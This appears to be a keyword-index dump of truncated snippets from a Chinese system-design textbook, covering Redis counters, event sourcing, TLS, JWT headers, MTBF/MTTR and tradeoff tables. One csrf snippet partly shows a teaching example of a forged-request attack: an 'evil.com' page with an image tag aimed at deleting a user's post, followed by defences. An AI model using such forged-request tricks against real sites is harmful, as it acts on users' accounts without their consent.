  c06_b11.md: ...在关系型数据库中，hashtag 计数来自聚合查询（COUNT + GROUP BY）。想想这个查询在 50 million（5000 万）帖子表上运行...
  c06_b11.md: ...INDEX idx_hashtags_created_at ON hashtags(created_at);   热门 hashtag 查询：       SELECT tag, COUNT(*) as count     FROM hashtags...
  c06_b11.md: ...0;   **Tradeoff（权衡）：** 如果每天有 50 million（5000 万）帖子、每个帖子约 2 个 hashtag，这个查询扫描过去 24 小时的 1 亿行。即使有 `created_at` 索引，聚合和排序也很昂贵。在规模下，这个查...
  c06_b11.md: ...刷新一次的热门功能来说太慢。  **Redis 方案（sorted set，有序集合）：**  帖子创建时，原子递增其 hashtag 在有序集合中的 score：       ZINCRBY trending_hashtags:2024-01-15 1...
  c06_b11.md: ...ending_hashtags:2024-01-15 1 "#engineering"   取当天 Top 10 热门 hashtag：       ZREVRANGE trending_hashtags:2024-01-15 0 9 WITHSCORE...
  c06_b11.md: ...窗口，查询两个日桶再在应用代码中合并。  **Tradeoff（权衡）：** 有序集合在每次帖子创建时增量更新——每个 hashtag 更新 O(log n)。读取查询是 O(log n + k)，k 为 10。两者都在内存中，耗时微秒。代价：Redis...
  c06_b11.md: ...在写入时预计算昂贵聚合以换取快速读取。Redis 有序集合是一种持续更新的聚合：不是在读取时计算“过去 24 小时这个 hashtag 用了多少次？”（昂贵），而是在帖子创建时实时维护答案。  **Q3.** 一家医疗初创公司在构建患者记录系统。每份患者...
  c06_b14.md: ...考虑一个真实产品如 Instagram：用户资料（可变属性）、社交图（朋友和关注关系）、照片存储（大二进制文件）、热门 hashtag（实时计数器）、私信（每对话按时间序）。你会把哪种数据库家族分配给每个关注点，为什么？有哪种数据库家族能同时胜任多个关注...
  c06_b15.md: ...* 对象存储（S3 或等效）。大二进制文件通过 URL 访问，读取多次、写入一次。这明确是对象存储的场景。  **热门 hashtag：** 带有序集合的键值存储（Redis）。每个帖子的实时计数器更新，查询 Top-N。Redis 的 `ZINCRBY...
  c06_b15.md: ...息”。这是 Cassandra 擅长的时间序列访问模式。  唯一出现在多个关注点中的家族是键值：Redis 既服务热门 hashtag 有序集合，也服务会话存储、限流和缓存。这强化了本章观点：键值存储几乎从来不是_唯一_的数据库——但它们作为补充出现在几...

=== csrf (13 occurrences) ===
  c07_b17.md: ...容（缓存版本不能包含“你已关注 Alice”指示）   2. 没有个性化的“为你推荐”区块   3. 响应体中不能包含 CSRF token 或其他 per-user 安全令牌  已登录用户不能直接使用 CDN 缓存版本，因为他们期望页面显示他们与...
  c19_b07.md: ...个 SocialSnap 请求都自动包含该 cookie——浏览器对所有发往该域的请求都会发送它，无论请求来源何处。  CSRF 攻击利用这一点。攻击者在 `evil.com` 创建页面：       <img src="https://socia...
  c19_b07.md: ...SocialSnap 看到带有有效会话 cookie 的请求（浏览器自动发送）并删除帖子 12345。  修复方法：**CSRF token**。SocialSnap 渲染每个表单时生成一个随机的、用户特定的 token，并作为隐藏字段包含。浏览器...
  c19_b07.md: ...SocialSnap 处理请求前验证 token。由于 `evil.com` 无法读取 SocialSnap 表单中的 CSRF token（被同源策略阻止），它无法伪造有效请求。  **SameSite cookie 属性** 是现代防御：在会话...
  c19_b07.md: ...Strict` 或 `SameSite=Lax`，告诉浏览器不在跨源请求上发送 cookie。这基本消除了现代浏览器的 CSRF 风险。   #### 常见误解  常见误解是这些漏洞是“已解决的问题”——现代框架自动处理。这部分正确：现代 ORM...
  c19_b10.md: ...证） | 无降级 | 低 | 无状态认证 参数化查询 | 无 | 无 | 无（只要正确写代码） | 防止 SQL 注入 CSRF token | 可忽略 | 无 | 低 | 防止 CSRF 零信任 mTLS | 中（每次连接握手） | 略降（证书过...
  c19_b10.md: ...| 无 | 无（只要正确写代码） | 防止 SQL 注入 CSRF token | 可忽略 | 无 | 低 | 防止 CSRF 零信任 mTLS | 中（每次连接握手） | 略降（证书过期导致失败） | 高（证书轮换、PKI 管理） | 防止横向...
  c19_b10.md: ...加密 | 可忽略（硬件加速） | 无降级 | 低（密钥管理） | 防止磁盘被盗  观察：大多数基础安全实践（参数化查询、CSRF token、TLS）开销可忽略。昂贵的是零信任 mTLS——它是否值得取决于威胁模型。  你的威胁模型是什么？一个没有...
  c19_b12.md: ...侵会让攻击者删除所有用户数据、修改支付记录、提升他们在其他系统的权限。最小权限限制爆炸半径。  **Q4.** 什么是 CSRF 攻击，为什么 SameSite cookie 属性能提供保护？...
  c19_b13.md: ...**答案：** CSRF 攻击诱使用户的浏览器在用户已认证的站点上发起请求，而用户并不知情。浏览器会自动在所有发往该域的请求上包含会话 cook...
  c19_b17.md: ...或未经授权的数据库访问）。密码不被加密——它们用故意很慢的算法哈希。  三种经典 Web 漏洞——SQL 注入、XSS、CSRF——都共享一个根因：把用户输入当作可信代码或可信状态。防御措施——参数化查询、HTML 转义、CSRF token——都...
  c19_b17.md: ...L 注入、XSS、CSRF——都共享一个根因：把用户输入当作可信代码或可信状态。防御措施——参数化查询、HTML 转义、CSRF token——都共享同一原则：把代码与数据分开。  零信任架构放弃边界模型，要求每次服务调用都进行认证和授权。攻击者作...
  c19_b17.md: ...下限制泄露。  安全权衡与所有系统设计权衡一样可量化。威胁模型决定哪些防御是必要的。大多数基础实践（参数化查询、TLS、CSRF token）运营成本可忽略，应普遍采用。昂贵的防御（零信任 mTLS、字段级加密）应在风险证明成本合理的地方应用。...

=== event (13 occurrences) ===
  c08_b06.md: ...。  **事件溯源** 存储**事件历史**而非当前状态。系统不存“Alice 当前简介是 X”，而是存：       Event 1: UserCreated(user_id=1, name="Alice", bio="Hello!")     E...
  c08_b06.md: ...t 1: UserCreated(user_id=1, name="Alice", bio="Hello!")     Event 2: UserBioUpdated(user_id=1, new_bio="Software engineer at...
  c08_b06.md: ...Updated(user_id=1, new_bio="Software engineer at Acme")     Event 3: UserBioUpdated(user_id=1, new_bio="CTO at SocialSnap")...
  c08_b07.md: ...UIRED — user must exist)         ↓ 2. Publish "user.signup" event to message queue (fast, ~2ms)         ↓     Return HTTP 200...
  c08_b07.md: ...Queue Consumer: Email Service         ← reads "user.signup" event from queue         ← sends welcome email (300ms — doesn't b...
  c08_b07.md: ...e Consumer: Analytics Service         ← reads "user.signup" event from queue         ← logs the event (50ms — doesn't block t...
  c08_b07.md: ...← reads "user.signup" event from queue         ← logs the event (50ms — doesn't block the user)      Queue Consumer: Contac...
  c08_b07.md: ...Contact Notification Service         ← reads "user.signup" event from queue         ← notifies connected friends (200ms — do...
  c08_b11.md: ...等：       def process_signup_event(event):         user_id = event['user_id']          # Check if we already sent the welcome...
  c15_b07.md: ...e payment record to the database     COMMIT;     // Publish event to message queue: "payment.charge.succeeded"   数据库提交与事件发布之间...
  c15_b07.md: ...存但事件从未发布。Saga 卡住——没有事件意味着下一步永远不运行。  另一种顺序：       // Publish event to message queue: "payment.charge.succeeded"     BEGIN;...
  c17_b04.md: ...level": "ERROR",       "service": "profile-service",       "event": "profile_load_failed",       "user_id": "user_8821934",...
  c28_b12.md: ...Ch 8, 14) | 读延迟更低（优化读模型） | 最终（读模型可能落后写模型） | 高 | 高——维护两个模型 **Event sourcing** (Ch 8, 14) | 事件回放查询更高 | 强（事件日志是真相来源） | 极高（日志只追加、...

=== tls (13 occurrences) ===
  c09_b01.md: ...接的协议：在发送任何数据前，它执行三次握手（SYN → SYN-ACK → ACK）以建立可靠连接。  **第 3 步：TLS 握手。** 对 HTTPS 连接，额外的 TLS（Transport Layer Security）握手协商加密密钥。...
  c09_b01.md: ...→ SYN-ACK → ACK）以建立可靠连接。  **第 3 步：TLS 握手。** 对 HTTPS 连接，额外的 TLS（Transport Layer Security）握手协商加密密钥。这增加 1–2 次往返延迟。  **第 4 步：H...
  c09_b03.md: ...优化的服务器集群 * 按地理区域路由（通过 IP 地理位置）  **SSL 终止：** L7 负载均衡器通常在自身终止 TLS。浏览器与负载均衡器建立加密 HTTPS 连接。负载均衡器解密请求、检查，然后（通常不加密）转发到内部网络的后端服务器。...
  c09_b03.md: ...衡器建立加密 HTTPS 连接。负载均衡器解密请求、检查，然后（通常不加密）转发到内部网络的后端服务器。这把计算昂贵的 TLS 处理从应用服务器卸载到负载均衡器。  **优点：** 基于内容的路由、SSL 终止、头操作、限流（9.7 节会讲）。...
  c19_b04.md: ...证验证身份。但即使正确认证的请求也会通过网络传输并存储在磁盘上——两者都可能被对手截获。   #### HTTPS 与 TLS——传输中加密  当用户浏览器向 `https://socialsnap.com` 发送请求时，数据以数据包形式在互联网...
  c19_b04.md: ...的路由器——都能读取这些数据包内容。这是**中间人攻击（man-in-the-middle attack）**。  **TLS（Transport Layer Security）**——HTTPS 所使用——加密所有传输中数据。浏览器和服务器执行...
  c19_b04.md: ...ansport Layer Security）**——HTTPS 所使用——加密所有传输中数据。浏览器和服务器执行 **TLS 握手**：  1. 认证服务器：服务器出示由可信证书颁发机构（CA）签名的 TLS 证书。浏览器验证证书链——该证书由...
  c19_b04.md: ...传输中数据。浏览器和服务器执行 **TLS 握手**：  1. 认证服务器：服务器出示由可信证书颁发机构（CA）签名的 TLS 证书。浏览器验证证书链——该证书由 DigiCert 签名，而 DigiCert 在浏览器证书库中可信。这证明服务器确...
  c19_b04.md: ...钥从未以明文传输。  **系统设计师规则：** 所有外部流量都应使用 HTTPS。数据中心内所有服务间内部流量也应使用 TLS——假设内部网络“安全”是零信任的违反（我们在下面讨论零信任）。证书应由你自己的内部 CA 颁发给服务间通信，由公共 C...
  c19_b09.md: ...#### 密钥管理  服务运行需要密钥：数据库密码、第三方服务 API key、TLS 私钥、JWT 签名密钥。安全地管理这些密钥是关键运营挑战。  幼稚做法——把密钥存在配置文件或环境变量中——带来多种风...
  c19_b10.md: ...安全措施 | 延迟影响 | 可用性影响 | 运营复杂度 | 获得的保护 ---|---|---|---|--- 全站 TLS | 小（握手开销，约 1-5ms） | 无降级 | 中（证书管理） | 防止中间人 JWT 验证 | 很小（CPU：签...
  c19_b10.md: ...加速） | 无降级 | 低（密钥管理） | 防止磁盘被盗  观察：大多数基础安全实践（参数化查询、CSRF token、TLS）开销可忽略。昂贵的是零信任 mTLS——它是否值得取决于威胁模型。  你的威胁模型是什么？一个没有已知对手、没有支付数...
  c20_b07.md: ...hort.ly/abc1234`）。这是产品决策，但有重大架构影响。  **HTTPS 证书：** 每个自定义域名需要 TLS 证书。通过 Let's Encrypt 为每个新自定义域名自动颁发证书，需要一个 ACME（Automatic Cer...

=== header (13 occurrences) ===
  c11_b06.md: ...，如果把会话数据以不可篡改格式存在客户端会怎样？  JWT 是一个紧凑、URL 安全的字符串，包含：  1. 一个 **header**（算法和 token 类型） 2. 一个 **payload**（claims——会话数据：user_id、user...
  c17_b05.md: ...EBUG 日志详尽。数据库服务中，DEBUG 日志可能记录执行的每条 SQL。API 处理器中，可能记录每个请求的每个 header。开发和调试时 invaluable，但生产环境产生巨大体量——通常是 INFO 日志的十到一百倍。大多数生产系统默认关...
  c17_b07.md: ...负载均衡器），生成一个 **trace ID**——通常是随机的 128 位 ID。这个 ID 附加到请求上（HTTP header：`X-Trace-ID: abc123`）。  处理请求的每个服务读取这个 header，记录一个 span，并在所有...
  c17_b07.md: ...ID 附加到请求上（HTTP header：`X-Trace-ID: abc123`）。  处理请求的每个服务读取这个 header，记录一个 span，并在所有下游调用中传播 trace ID。每个 span 记录：trace ID、span ID（...
  c19_b03.md: ...se64url 编码、密码学签名的字符串，编码一个 JSON payload。  JWT 由点分隔的三部分组成：  **Header**（用于签名 token 的算法）：`{"alg": "RS256", "typ": "JWT"}`  **Paylo...
  c19_b03.md: ...pe": "read:posts write:posts"     }   **Signature**：用服务器私钥对 header 和 payload 做的密码学签名。  完整 token 形如：`eyJhbGci...eyJzdWIi...SflK...
  c19_b03.md: ...se64url 编码、密码学签名的字符串，编码一个 JSON payload。  JWT 由点分隔的三部分组成：  **Header**（用于签名 token 的算法）：`{"alg": "RS256", "typ": "JWT"}`  **Paylo...
  c19_b03.md: ...pe": "read:posts write:posts"     }   **Signature**：用服务器私钥对 header 和 payload 做的密码学签名。  完整 token 形如：`eyJhbGci...eyJzdWIi...SflK...
  c19_b06.md: ...原因的。  额外防御：**内容安全策略（Content Security Policy，CSP）**——一种 HTTP header，指示浏览器只执行可信来源的脚本（`script-src 'self'` 意味着只执行同源的脚本）。即使注入 XSS p...
  c19_b11.md: ...捕获所有异常并返回通用错误消息；把完整堆栈跟踪记录到内部日志。  **版本披露：** 透露服务器软件和版本的 HTTP header（`Server: nginx/1.14.0`）让攻击者搜索这些版本的已知漏洞。移除或混淆版本 header。  安全根...
  c19_b11.md: ...HTTP header（`Server: nginx/1.14.0`）让攻击者搜索这些版本的已知漏洞。移除或混淆版本 header。  安全根本上是信息不对称：让对手难以学到足以利用系统的信息，同时让合法用户轻松完成工作。系统泄露的每一条信息都是攻击...
  c19_b14.md: ...API 请求：** 应用在每个请求中包含 `Authorization: Bearer <access_token>` header。SocialSnap 验证 JWT 签名并检查 `scope` claim，确保请求操作在授予范围内。  **Toke...
  c20_b02.md: ...可放在几百个带复制的高密度 SSD 节点上。  **带宽估算：**  * 读：每次重定向响应是带 `Location` header 的 301/302 HTTP 响应——大约 500 字节 * 116,000 RPS × 500 字节 = **58...

=== page (13 occurrences) ===
  c14_b12.md: ...z enthusiasts.”。两次写入几乎同时在当地成功。数据中心互相复制时，两个节点发现同一个 community page 的 `description` 字段有不同值——真正的写冲突。  该场景下的解决选项：...
  c17_b08.md: ...是否需要立即人工处理？”如果答案是否定的——如果告警只是信息性的、可以等到早上、代表正在自动处理的状态——那它就不应该 page 任何人。它应该去仪表盘、工单或非紧急通知渠道。  凌晨 3 点为一个非紧急告警叫醒人，会侵蚀对告警系统的信任。信任被侵...
  c17_b08.md: ...告警“只想睡一觉”。最终抓住真正 outage 的告警可能和那些噪声一起被静音。  理想的 on-call 体验：每次 page 都是真实的用户可见问题，每次 page 都需要无法自动化的人类判断，page 相对不频繁，因为好的监控在问题还没 pa...
  c17_b08.md: ...age 的告警可能和那些噪声一起被静音。  理想的 on-call 体验：每次 page 都是真实的用户可见问题，每次 page 都需要无法自动化的人类判断，page 相对不频繁，因为好的监控在问题还没 page 级严重时就及早发现。   ####...
  c17_b08.md: ...。  理想的 on-call 体验：每次 page 都是真实的用户可见问题，每次 page 都需要无法自动化的人类判断，page 相对不频繁，因为好的监控在问题还没 page 级严重时就及早发现。   #### 告警路由与 Runbook  当告警...
  c17_b08.md: ...ge 都是真实的用户可见问题，每次 page 都需要无法自动化的人类判断，page 相对不频繁，因为好的监控在问题还没 page 级严重时就及早发现。   #### 告警路由与 Runbook  当告警响起，on-call 工程师需要知道：这个告警...
  c17_b09.md: ...显示所有长耗时请求都有 Redis 超时的 span。  到 2:48——降级开始一分钟——on-call 工程师收到 page：“Redis 错误率 18%，p99 延迟 28 秒。”Runbook 说：检查 Redis 集群状态，检查熔断器是否...
  c17_b12.md: ...* 队列深度连续 10 分钟增长 → page on-call（消费者可能崩溃） * 邮件投递成功率 5 分钟低于 95% → page 邮件团队（第三方邮件提供商问...
  c17_b12.md: ...深度连续 10 分钟增长 → page on-call（消费者可能崩溃） * 邮件投递成功率 5 分钟低于 95% → page 邮件团队（第三方邮件提供商问题） * 消费者滞后超过 50,000 条消息 → page on-call（处理速度相对...
  c17_b12.md: ...率 5 分钟低于 95% → page 邮件团队（第三方邮件提供商问题） * 消费者滞后超过 50,000 条消息 → page on-call（处理速度相对于流量太慢） * 死信队列有消息 → 非紧急工单（调查无法投递通知的根因）  注意基于症状...
  c23_b02.md: ...e queue is not empty:         url = queue.dequeue()         page = fetch(url)         links = extract_links(page)         fo...
  c23_b02.md: ...n links:             queue.enqueue(link)         store(url, page)  这是对网页图做广度优先搜索，从一组种子 URL 开始。爬虫获取一个页面，发现新链接，并将它们加入队列供后续处理。...
  c23_b06.md: ..."distributed systems（分布式系统）" 500 次，单凭 TF-IDF 会得极高分数。  Larry Page 和 Sergey Brin 原创工作的关键洞察：链接即背书。一个网页链接到另一个网页时，链接页的作者隐含地为被链接页的...

=== mtbf (13 occurrences) ===
  c16_b02.md: ...#### MTBF 与 MTTR  两个指标定义任何系统的可靠性画像：  **平均故障间隔时间（Mean Time Between Fai...
  c16_b02.md: ...R  两个指标定义任何系统的可靠性画像：  **平均故障间隔时间（Mean Time Between Failures，MTBF）** 是两次故障之间的平均时间。MTBF 720 小时的系统大约每月失败一次。MTBF 8,760 小时的系统大约每年...
  c16_b02.md: ...**平均故障间隔时间（Mean Time Between Failures，MTBF）** 是两次故障之间的平均时间。MTBF 720 小时的系统大约每月失败一次。MTBF 8,760 小时的系统大约每年失败一次。MTBF 越高，故障越不频繁。...
  c16_b02.md: ...etween Failures，MTBF）** 是两次故障之间的平均时间。MTBF 720 小时的系统大约每月失败一次。MTBF 8,760 小时的系统大约每年失败一次。MTBF 越高，故障越不频繁。  **平均恢复时间（Mean Time To...
  c16_b02.md: ...两次故障之间的平均时间。MTBF 720 小时的系统大约每月失败一次。MTBF 8,760 小时的系统大约每年失败一次。MTBF 越高，故障越不频繁。  **平均恢复时间（Mean Time To Recovery，MTTR）** 是故障后恢复服务...
  c16_b02.md: ...。MTTR 越低，恢复越快。  **可用性（availability）** 用两者表达：`Availability = MTBF / (MTBF + MTTR)`。著名的可用性“几个 9”就是该比率的目标：  * 99% 可用性（“两个 9”）：每...
  c16_b12.md: ...#### 概念检测  **Q1.** 定义 MTBF 和 MTTR。在频繁失败且恢复时间短的系统中，哪个对可用性影响更大？  **答案：** MTBF（平均故障间隔时间）是...
  c16_b12.md: ...**Q1.** 定义 MTBF 和 MTTR。在频繁失败且恢复时间短的系统中，哪个对可用性影响更大？  **答案：** MTBF（平均故障间隔时间）是两次故障事件之间的平均时间——系统失败的频率。MTTR（平均恢复时间）是故障后恢复服务的平均时间—...
  c16_b12.md: ...系统失败的频率。MTTR（平均恢复时间）是故障后恢复服务的平均时间——系统恢复的速度。  Availability = MTBF / (MTBF + MTTR)。  在频繁失败且恢复时间短的系统中，MTTR 的边际影响更大。例如：MTBF = 10...
  c16_b12.md: ...ty = MTBF / (MTBF + MTTR)。  在频繁失败且恢复时间短的系统中，MTTR 的边际影响更大。例如：MTBF = 10 小时（每天失败 6 次），MTTR = 5 分钟。可用性 = 10 / (10 + 0.083) ≈ 99....
  c16_b12.md: ...TR 降到 1 分钟（提升 5 倍），可用性 = 10 / (10 + 0.017) ≈ 99.8%——显著提升。如果 MTBF 翻倍到 20 小时（失败频率减半），可用性 = 20 / (20 + 0.083) ≈ 99.6%——也是显著提升，但...
  c16_b12.md: ...显著提升，但通常比提升恢复速度更难实现。  在高频失败环境（硬件故障、网络链路抖动）中，降低 MTTR 通常比大幅降低 MTBF 更可行。这是 SRE 的理念：投资于快速检测、快速诊断和快速恢复，而不是试图让单个组件达到不可能的高可靠性。  **Q...
  c16_b19.md: ...### 本章总结  本章通过解决“即使是设计良好的系统也会失败”这一现实，完成了架构之旅。理解 MTBF 和 MTTR 把可靠性从“防止所有失败”重新定义为“快速失败并快速恢复”。可用性由两个维度决定，降低 MTTR 通常是...

=== pattern (13 occurrences) ===
  c21_b09.md: ...存储。如果持久化成功但投递失败（接收者离线），消息已存储，待接收者重连时投递。先持久化模式与第 15 章 Outbox Pattern 原则相同——先写数据库，再触发副作用。...
  c28_b10.md: ...#### 第一部分：基础  Pattern / Concept | Latency Impact | Consistency Impact | Availabil...
  c28_b11.md: ...#### 第二部分：构建块  Pattern / Concept | Latency Impact | Consistency Impact | Availabil...
  c28_b12.md: ...#### 第三部分：扩展模式  Pattern / Concept | Latency Impact | Consistency Impact | Availabil...
  c28_b12.md: ...两次网络往返） | 强（分布式 ACID） | 低——任何参与者失败阻塞提交 | 极高——协调者故障风险 **Saga pattern** (Ch 14) | 中（顺序补偿） | 最终（补偿事务） | 高 | 高——补偿事务设计 **Circuit br...
  c28_b12.md: ...#### 第三部分：扩展模式  Pattern / Concept | Latency Impact | Consistency Impact | Availabil...
  c28_b12.md: ...两次网络往返） | 强（分布式 ACID） | 低——任何参与者失败阻塞提交 | 极高——协调者故障风险 **Saga pattern** (Ch 14) | 中（顺序补偿） | 最终（补偿事务） | 高 | 高——补偿事务设计 **Circuit br...
  c28_b13.md: ...#### 第四部分：可靠性与运维  Pattern / Concept | Latency Impact | Consistency Impact | Availabil...
  c28_b13.md: ...hecks** (Ch 16) | 无延迟开销 | N/A | 高——负载均衡器绕开故障 | 低 **Bulkhead pattern** (Ch 16) | 无延迟开销 | N/A | 极高——失败限制在一个池 | 中 **Retry with bac...
  c28_b13.md: ...#### 第四部分：可靠性与运维  Pattern / Concept | Latency Impact | Consistency Impact | Availabil...
  c28_b13.md: ...hecks** (Ch 16) | 无延迟开销 | N/A | 高——负载均衡器绕开故障 | 低 **Bulkhead pattern** (Ch 16) | 无延迟开销 | N/A | 极高——失败限制在一个池 | 中 **Retry with bac...
  c28_b14.md: ...#### 第五部分：案例研究模式  Pattern / Concept | Latency Impact | Consistency Impact | Availabil...
  c28_b15.md: ...#### 第六部分：组织与元层面  Pattern / Concept | Latency Impact | Consistency Impact | Availabil...

=== document (13 occurrences) ===
  c23_b05.md: ...倒排索引。查询 "distributed systems" 并行命中所有分片；每个分片返回本地结果；结果合并。这叫 **document-based sharding**。  实践中，大型搜索引擎使用 document-based sharding，因为它...
  c23_b05.md: ...分片返回本地结果；结果合并。这叫 **document-based sharding**。  实践中，大型搜索引擎使用 document-based sharding，因为它允许最自然的并行：查询同时发往所有分片，每个分片并行产生结果，再合并。Term-b...
  c23_b06.md: ...？"systems" 太常见，高频几乎不能说明什么。  TF-IDF（Term Frequency - Inverse Document Frequency）的直觉是：  * **Term Frequency (TF)：** 一个词在文档中出现很多次，可能...
  c23_b06.md: ...对文档很重要。如果 "consistency" 在文档中出现 30 次，该文档很可能讲一致性。 * **Inverse Document Frequency (IDF)：** 一个词在极少文档中出现，它出现时就是强信号。如果 "zkSNARK" 在 100...
  c23_b06.md: ...频繁，且在整个文档集中罕见。  TF-IDF(t,d)=TF(t,d)×IDF(t) TF(t,d)=term t 在 document d 中的次数 / document d 中的总词数 IDF(t)=log(总文档数 / 包含 t 的文档数)  出现在...
  c23_b06.md: ...-IDF(t,d)=TF(t,d)×IDF(t) TF(t,d)=term t 在 document d 中的次数 / document d 中的总词数 IDF(t)=log(总文档数 / 包含 t 的文档数)  出现在每份文档中的词 IDF = log(...
  c23_b06.md: ...？"systems" 太常见，高频几乎不能说明什么。  TF-IDF（Term Frequency - Inverse Document Frequency）的直觉是：  * **Term Frequency (TF)：** 一个词在文档中出现很多次，可能...
  c23_b06.md: ...对文档很重要。如果 "consistency" 在文档中出现 30 次，该文档很可能讲一致性。 * **Inverse Document Frequency (IDF)：** 一个词在极少文档中出现，它出现时就是强信号。如果 "zkSNARK" 在 100...
  c23_b06.md: ...频繁，且在整个文档集中罕见。  TF-IDF(t,d)=TF(t,d)×IDF(t) TF(t,d)=term t 在 document d 中的次数 / document d 中的总词数 IDF(t)=log(总文档数 / 包含 t 的文档数)  出现在...
  c23_b06.md: ...-IDF(t,d)=TF(t,d)×IDF(t) TF(t,d)=term t 在 document d 中的次数 / document d 中的总词数 IDF(t)=log(总文档数 / 包含 t 的文档数)  出现在每份文档中的词 IDF = log(...
  c23_b10.md: ...posting 存文档 ID（8 字节）、词频（4 字节）和第一个位置（4 字节）。  提示  索引中 (term, document) 对总数是关键量。思考平均每页对索引的贡献，然后放大。  **答案：** 每页约贡献 2,000 个 posting（...
  c23_b10.md: ...及其在 posting list 中的偏移）是 comparatively 小的额外结构。  **Q2.** 一个使用 document-based sharding 的搜索引擎有 100 个分片，每个分片持有 1 亿（100 million）页。用户提交...
  c28_b11.md: ...tree indexes** (Ch 5) | 降低读延迟；提高写延迟 | N/A | N/A | 低——自动维护 **Document store (MongoDB)** (Ch 6) | 文档级操作低 | 最终（默认）；可配置 | 高（副本集） | 中...

=== matrix (12 occurrences) ===
  c01_b11.md: ...，而不是数学——你收集证据、权衡 tradeoff、做出判断，并随时准备修正。我们在第 2 章引入的 Tradeoff Matrix（权衡矩阵）就是让这一判断过程更明确、更可重复的工具。...
  c02_b06.md: ...### 2.6 权衡矩阵（Tradeoff Matrix）  现在我们有了核心词汇。让我们引入一个将在全书使用的工具：**Tradeoff Matrix（权衡矩阵）**。  系...
  c02_b06.md: ...矩阵（Tradeoff Matrix）  现在我们有了核心词汇。让我们引入一个将在全书使用的工具：**Tradeoff Matrix（权衡矩阵）**。  系统设计中的每个架构决策都会改变这些指标的值。权衡矩阵让这些变化显式化。下面是带三行初始种子的初始...
  c02_b11.md: ...*只是支付服务的 99.95%**——每年约 263 分钟停机，而不是 788 分钟。  这是本章**Tradeoff Matrix（权衡矩阵）中队列那一行**的直接应用：添加队列提高生产者可用性并解耦服务故障，代价是最终（而非即时）处理。   ###...
  c02_b11.md: ...丢失消息。如果队列是临时的，这一格可能是 ↓，相对于立即持久化数据的同步调用。  这个练习说明为什么 Tradeoff Matrix 必须始终明确_从谁的视角_ 测量变化。系统设计充满“看情况”——矩阵让这些依赖显式化，而不是隐藏它们。...
  c02_b12.md: ...性和延迟。使用最终一致性而非强一致性，你获得吞吐和可用性，代价是无法保证所有读者看到相同数据。  **Tradeoff Matrix（权衡矩阵）** 是让你把这些成本和收益显式化的工具。全书我们会不断给它加行——到最后一章，它将包含主要架构模式及其后果...
  c27_b06.md: ...流量。如果出错，立即回滚。  * * *   ### 27.3 权衡矩阵作为活文档  回忆第 2 章：Tradeoff Matrix 作为跨四个维度比较设计选择的工具被引入。全书过程中，每新增一个构建块、扩展模式和案例研究，我们都往矩阵里加行。  对...
  c27_b06.md: ...。全书过程中，每新增一个构建块、扩展模式和案例研究，我们都往矩阵里加行。  对 SocialSnap，Tradeoff Matrix 不是写一次就归档的文档。它是架构团队每次重大设计决策都更新的活工件。看它是如何演变的：  **v1（添加数据库）时：*...
  c27_b06.md: ...owning；需要分布式追踪；更高运营复杂度。”  维护这个矩阵的力量：新工程师加入团队时，可以读 Tradeoff Matrix，不仅理解决策是什么，还理解决策为什么做。矩阵捕获推理，而不仅仅是结论。  到第 26 章，SocialSnap 的 T...
  c27_b06.md: ...什么，还理解决策为什么做。矩阵捕获推理，而不仅仅是结论。  到第 26 章，SocialSnap 的 Tradeoff Matrix 已有数十行。第 28 章呈现完整版——全书完整参考卡。  * * *...
  c27_b11.md: ...。开关变更通过 gossip（第 26 章）在 10 秒内传播到所有路由节点。  **Q3.** 从 Tradeoff Matrix 视角审视 SocialSnap 演进。在每次主要版本变更（v1 到 v7）中，找出一个设计决策、它做出的权衡以及表明该...
  intro.md: ...构决策时，你已经和这些决策共处了数百页——它们会显得来之不易，而非抽象空洞。  另外两条线索贯穿全书。Tradeoff Matrix（权衡矩阵）在第 2 章以一个简单的三列表格引入，每做一个重大架构决策就增加一行。到第 28 章，它已成为每位资深工程师...

=== per (12 occurrences) ===
  c02_b01.md: ...*Throughput（吞吐）** 是系统每单位时间能处理的操作数量。对于 Web 服务，通常用 **requests per second（RPS，每秒请求数）** 或 **queries per second（QPS，每秒查询数）** 表示。...
  c02_b01.md: ...于 Web 服务，通常用 **requests per second（RPS，每秒请求数）** 或 **queries per second（QPS，每秒查询数）** 表示。  用大白话说：吞吐是系统能同时持续做多少件事。如果你的 Web 服务器...
  c07_b15.md: ...Feed 是 per-user 的——每个用户看到不同 Feed。这意味着每个用户一个缓存 key。想想 Feed 多久变化：用户网络中某处...
  c07_b17.md: ...Alice”指示）   2. 没有个性化的“为你推荐”区块   3. 响应体中不能包含 CSRF token 或其他 per-user 安全令牌  已登录用户不能直接使用 CDN 缓存版本，因为他们期望页面显示他们与 Alice 的关系（关注/...
  c14_b13.md: ...一帖子点赞时，美国数据中心把 `us-east` 从 1203 本地递增到 1204。  任何用户看到的点赞总数是所有 per-data-center 计数器之和：本例中 1203 + 847 + 412 = 2462。每个数据中心从本地 per...
  c14_b13.md: ...per-data-center 计数器之和：本例中 1203 + 847 + 412 = 2462。每个数据中心从本地 per-data-center map 副本计算该总和。  收敛期间：数据中心定期互相复制它们的 per-data-cente...
  c14_b13.md: ...。每个数据中心从本地 per-data-center map 副本计算该总和。  收敛期间：数据中心定期互相复制它们的 per-data-center map。合并操作很简单——对每个数据中心计数器取最大值。如果 EU 节点有 `{"us-eas...
  c22_b02.md: ...万（5 million）并发 feed 观看者时，这是每小时 25 亿（2.5 billion）次数据库查询。即使对 per-user 帖子列表做激进缓存，读放大也巨大。   #### 根本张力  写时扇出用写入成本换读取速度。读时扇出用读取成...
  c23_b02.md: ...耗尽它全部容量。这称为 **爬取速率限制** 或 **礼貌** 问题。  解决方案是按域名限速爬取请求。每个域名有 **per-domain 队列**：每个域名一次只取一个 URL，请求之间设可配置延迟（例如 1 秒）。机器人遵守 `robots...
  c23_b02.md: ...貌，还有法律意义：忽略 `robots.txt` 可能让公司承担法律责任。  **URL frontier 设计。** per-domain 队列、礼貌控制和优先级（某些页面更重要，应优先爬取）的组合称为 **URL frontier**。URL...
  c23_b03.md: ...什么速率的组件。设计良好的 URL frontier 具备：  1. **多队列**，通常每个域名或域名组一个，以执行 per-domain 爬取速率 2. **优先队列**，按估计重要性排序 URL（重要 URL 先爬） 3. **调度层**，...
  c23_b09.md: ...IFO 队列不足，原因有三：(1) 它会让爬虫向单个域名发送大量并行请求，压垮该域服务器。URL frontier 用 per-domain 队列执行礼貌策略（每个域名一次一个请求，可配置延迟）。(2) 有些页面更重要，应优先爬取（高 PageR...

=== once (12 occurrences) ===
  c02_b09.md: ...（垃圾回收）停顿和网络抖动也不突破预算——这需要复杂昂贵得多的送达管道。  **送达率 vs 恰好一次（exactly-once）：** 99.5% 的送达率（不是 100%）承认通知系统可能偶尔丢失事件。保证 100% 需要分布式系统中的 exa...
